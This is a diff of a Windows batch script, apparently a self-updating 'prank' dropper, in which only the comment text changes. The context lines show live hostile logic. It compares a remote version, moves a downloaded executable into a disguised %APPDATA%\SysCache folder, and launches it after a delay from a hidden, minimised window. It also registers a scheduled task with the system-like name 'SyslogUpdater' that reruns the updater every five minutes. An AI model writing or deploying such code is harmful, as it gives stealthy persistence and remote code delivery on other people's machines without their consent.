@@ -1,10 +1,10 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: -------------------------------------------------------------------
-:: Configuration – change DELAY to modify the first‑run waiting time
-:: (value in seconds; 600 = 10 minutes)
-:: -------------------------------------------------------------------
+:: ===================================================================
+:: Configuration – change DELAY to set the waiting time before first run
+:: Value is in seconds (600 = 10 minutes, 3600 = 1 hour, etc.)
+:: ===================================================================
 set "DELAY=600"
 
 set "BASE=%APPDATA%\SysCache"
@@ -36,20 +36,19 @@ if not "%LOCAL%"=="%REMOTE%" (
     if exist "%DOWNLOAD%" (
         move /Y "%DOWNLOAD%" "%PRANK%" >nul
         echo %REMOTE% > "%LOCAL_VER%"
-        :: Signal that this is the first installation – the prank should be started after a delay
+        :: Mark that this is the first installation – the prank should start after a delay
         echo. > "%FIRSTRUN_FLAG%"
     )
 )
 
 :RUN
-:: Handle the first‑run delay if the flag exists
+:: Handle first‑run delay if the flag exists
 if exist "%FIRSTRUN_FLAG%" (
-    :: Launch a hidden command window that waits for DELAY seconds and then starts the prank
+    :: Launch a hidden window that waits for DELAY seconds and then starts the prank
     start /min cmd /c "timeout /t %DELAY% /nobreak >nul & start \"\" \"%PRANK%\""
     del "%FIRSTRUN_FLAG%"
 )
 :: On subsequent runs the flag is gone, so the prank is not started again.
-:: (If you later want to restart the prank when it exits, you can add a check here.)
 
 :: Create scheduled task that runs THIS UPDATER every 5 minutes
 schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo 5 /f >nul 2>&1
